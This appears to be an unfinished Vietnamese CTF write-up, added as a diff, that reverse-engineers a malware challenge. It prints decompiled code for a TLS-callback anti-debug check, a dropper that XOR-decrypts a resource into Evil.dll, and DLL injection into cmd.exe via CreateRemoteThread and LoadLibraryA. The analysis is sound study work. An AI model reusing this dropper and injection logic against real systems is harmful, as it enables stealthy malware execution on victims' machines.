@@ -1946,3 +1946,242 @@
     KCSC{chachacha_w1th_me_and_welc0me_2_KCSC}
     ```
 
+# 10_STEAL (HARD_đang hoàn thiện)
+
+- Chall: [FILE](CHALL/7_steal_hard.zip).
+
+- File này cho chúng ta 1 file thực thi và một file `pcapng`. Ta tiến hành phân tích hàm file thực thi trước.
+
+- Nhìn sơ qua chall này thì ta thấy có hàm `TlsCallBack`, đầy là một hàm được gọi trước hàm `main()` và thường được dùng để check chương trình có đang bị debug hay không. Trong bài này hàm đó cũng có mục đích như vậy.
+
+    ![alt text](IMG/8/image.png)
+
+    Chương trình sử dụng `IsDebuggerPresent()` và `DebugBreak()` để kiểm tra xem có chương trình có đang bị debug hay không, nếu đang bị debug sẽ nhảy qua luồng gọi 2 hàm `sub_7FF729AB1070` và `sub_7FF729AB1070`.
+
+    ![alt text](IMG/8/image-1.png)
+
+- Phân tích hàm `sub_7FF729AB1070()`:
+
+    ```C
+    int sub_7FF729AB1250()
+    {
+    HRSRC ResourceW; // rax
+    signed int v1; // edx
+    __int64 v2; // rcx
+    __m128 v3; // xmm0
+    __m128 v4; // xmm1
+    __int64 v5; // rax
+    HMODULE ModuleHandleW; // rdi
+    HRSRC v7; // rsi
+    size_t v8; // rbx
+    HRSRC v9; // r14
+    char *v10; // rdi
+    unsigned int v11; // r9d
+    char *v12; // rcx
+    __int64 v13; // rax
+    __int128 v15; // [rsp+10h] [rbp-F0h]
+    FILE *Stream; // [rsp+20h] [rbp-E0h] BYREF
+    DWORD Stream_8; // [rsp+28h] [rbp-D8h] BYREF
+    char Format[16]; // [rsp+30h] [rbp-D0h] BYREF
+    int v19; // [rsp+40h] [rbp-C0h]
+    int v20; // [rsp+44h] [rbp-BCh]
+    int v21; // [rsp+48h] [rbp-B8h]
+    int v22; // [rsp+4Ch] [rbp-B4h]
+    int v23; // [rsp+50h] [rbp-B0h]
+    int v24; // [rsp+54h] [rbp-ACh]
+    CHAR Buffer[256]; // [rsp+60h] [rbp-A0h] BYREF
+
+    *(_DWORD *)Format = 0x5A8D39D3;
+    *(_DWORD *)&Format[4] = 0x9D5DB16E;
+    *(_DWORD *)&Format[8] = 0x65FC17D7;
+    *(_DWORD *)&Format[12] = 0xB97C17DA;
+    v19 = 0x4B8F2CC8;
+    v20 = 0x3598DA68;
+    v21 = 0xF882F503;
+    v22 = 0x8CC789FB;
+    v23 = 0x9D8E9FA3;
+    v24 = 0xD04829;
+    Stream_8 = 0x100;
+    LODWORD(ResourceW) = GetUserNameA(Buffer, &Stream_8);
+    if ( (_DWORD)ResourceW )
+    {
+        v1 = 0;
+        v2 = 0i64;
+        do
+        {
+        v3 = (__m128)_mm_loadu_si128((const __m128i *)&Format[v2]);
+        v1 += 32;
+        v4 = (__m128)_mm_loadu_si128((const __m128i *)&byte_7FF729AB34C0[v2]);
+        v5 = v1;
+        v2 += 32i64;
+        *(__int128 *)((char *)&v15 + v2) = (__int128)_mm_xor_ps(v4, v3);
+        *(__m128 *)((char *)&Stream + v2) = _mm_xor_ps(
+                                                (__m128)_mm_loadu_si128((const __m128i *)&cp[v2]),
+                                                (__m128)_mm_loadu_si128((const __m128i *)((char *)&Stream + v2)));
+        }
+        while ( (unsigned __int64)v1 < 0x20 );
+        if ( (unsigned __int64)v1 < 0x28 )
+        {
+        do
+        {
+            ++v1;
+            Format[v5] ^= byte_7FF729AB34C0[v5];
+            ++v5;
+        }
+        while ( (unsigned int)v1 < 0x28 );
+        }
+        write_file(FileName, 0x104ui64, Format);
+        ModuleHandleW = GetModuleHandleW(0i64);
+        ResourceW = FindResourceW(ModuleHandleW, (LPCWSTR)0x65, L"BIN");
+        v7 = ResourceW;
+        if ( ResourceW )
+        {
+        LODWORD(ResourceW) = SizeofResource(ModuleHandleW, ResourceW);
+        v8 = (unsigned int)ResourceW;
+        if ( (_DWORD)ResourceW )
+        {
+            ResourceW = (HRSRC)LoadResource(ModuleHandleW, v7);
+            if ( ResourceW )
+            {
+            ResourceW = (HRSRC)LockResource(ResourceW);
+            v9 = ResourceW;
+            if ( ResourceW )
+            {
+                v10 = (char *)operator new((unsigned int)v8);
+                memcpy(v10, v9, (unsigned int)v8);
+                v11 = 0;
+                if ( (_DWORD)v8 )
+                {
+                v12 = v10;
+                do
+                {
+                    ++v12;
+                    v13 = v11++ & 0x1F;
+                    *(v12 - 1) ^= byte_7FF729AB34C0[v13 + 40];
+                }
+                while ( v11 < (unsigned int)v8 );
+                }
+                Stream = 0i64;
+                LODWORD(ResourceW) = fopen_s(&Stream, FileName, "wb");
+                if ( Stream )
+                {
+                fwrite(v10, 1ui64, v8, Stream);
+                LODWORD(ResourceW) = fclose(Stream);
+                }
+            }
+            }
+        }
+        }
+    }
+    return (int)ResourceW;
+    }
+    ```
+
+    Hàm `GetUserNameA` sử dụng để lấy tên người dùng hiện tại đang đăng nhập trên hệ thống. 
+
+    ![alt text](IMG/8/image-2.png)
+
+    Vòng `while-do` thực hiện phép xor và để có thể lấy được đường dẫn (chương trình sử dụng phép xor để khó có thể khó nhận ra khi debug):
+
+    ![alt text](IMG/8/image-3.png)
+
+    Thực hiện lấy handle của tiến trình hiện tại và lấy handle của `resource`.
+
+    ![alt text](IMG/8/image-4.png)
+
+    ![alt text](IMG/8/image-5.png)
+
+    Thực hiện lấy kích thước và dữ liệu của resource.
+
+    ![alt text](IMG/8/image-6.png)
+
+    ![alt text](IMG/8/image-7.png)
+
+    Chương trình thực hiện phép xor dữ liệu trong resource với dải byte cho trước. Sau đó tiến hành ghi vào file trong đường dẫn cho trước (trong TH này là file Evil.dll).
+
+    ![alt text](IMG/8/image-8.png)
+
+    Như vậy hàm này có chức năng load dữ liệu ở trong resource rùi thực hiện xor để  lấy được dữ liệu thực sự để để ghi vào file `Evil.dll`.
+
+- Hàm `sub_7FF7BB771070()`:
+
+    ```C
+    int sub_7FF7BB771070()
+    {
+    HMODULE ModuleHandleW; // rax
+    HMODULE (__stdcall *LoadLibraryA)(LPCSTR); // rsi
+    HANDLE Toolhelp32Snapshot; // rbx
+    __int64 v3; // rax
+    char v4; // cl
+    DWORD th32ProcessID; // r8d
+    HANDLE RemoteThread; // rax
+    void *v7; // rbx
+    void *v8; // rdi
+    void *v9; // rdi
+    __int64 PtNumOfCharConverted[2]; // [rsp+40h] [rbp-378h] BYREF
+    PROCESSENTRY32W pe; // [rsp+50h] [rbp-368h] BYREF
+    char Dst[272]; // [rsp+290h] [rbp-128h] BYREF
+
+    ModuleHandleW = GetModuleHandleW(L"kernel32.dll");
+    LoadLibraryA = (HMODULE (__stdcall *)(LPCSTR))GetProcAddress(ModuleHandleW, "LoadLibraryA");
+    pe.dwSize = 568;
+    Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
+    if ( Process32FirstW(Toolhelp32Snapshot, &pe) )
+    {
+        do
+        {
+        PtNumOfCharConverted[0] = 0i64;
+        wcstombs_s((size_t *)PtNumOfCharConverted, Dst, 0x104ui64, pe.szExeFile, 0xFFFFFFFFFFFFFFFFui64);
+        v3 = 0i64;
+        while ( 1 )
+        {
+            v4 = Dst[v3++];
+            if ( v4 != aCmdExe[v3 - 1] )
+            break;
+            if ( v3 == 8 )
+            {
+            th32ProcessID = pe.th32ProcessID;
+            goto LABEL_8;
+            }
+        }
+        }
+        while ( Process32NextW(Toolhelp32Snapshot, &pe) );
+    }
+    CloseHandle(Toolhelp32Snapshot);
+    th32ProcessID = 0;
+    LABEL_8:
+    RemoteThread = OpenProcess(0x43Au, 0, th32ProcessID);
+    v7 = RemoteThread;
+    if ( RemoteThread )
+    {
+        RemoteThread = VirtualAllocEx(RemoteThread, 0i64, 0x104ui64, 0x3000u, 0x40u);
+        v8 = RemoteThread;
+        if ( RemoteThread )
+        {
+        LODWORD(RemoteThread) = WriteProcessMemory(v7, RemoteThread, FileName, 0x104ui64, 0i64);
+        if ( (_DWORD)RemoteThread )
+        {
+            RemoteThread = CreateRemoteThread(v7, 0i64, 0i64, (LPTHREAD_START_ROUTINE)LoadLibraryA, v8, 0, 0i64);
+            v9 = RemoteThread;
+            if ( RemoteThread )
+            {
+            WaitForSingleObject(RemoteThread, 0xFFFFFFFF);
+            CloseHandle(v7);
+            CloseHandle(v9);
+            remove(FileName);
+            ExitProcess(0);
+            }
+        }
+        }
+    }
+    return (int)RemoteThread;
+    }
+    ```
+
+    Hàm này sẽ thực hiện tạo một danh sách các tiến trình trong hệ thống, lật lượt duyệt các tiến trình rùi kiểm tra xem có tiến trình `cmd.exe` không. Nếu thấy sẽ lưu lại ID của tiến trình.
+
+    Sau đó chương trình mở tiến trình cmd.exe với các quyền cấn thiết như đọc, ghi. Rùi cấp phát một vùng nhớ trong không gian địa chỉ của tiến trình đó. Tạo một luông từ xa để thực thi thư viện `Evil.dll`.
+
+    Như vậy tóm tắt lại hàm `sub_7FF7BB771070()` được dùng để tiêm dll vào tiến trình `cmd`.
+
+    `Em sẽ hoàn thành nốt bài này trong thời gian sớm nhất ạ.`
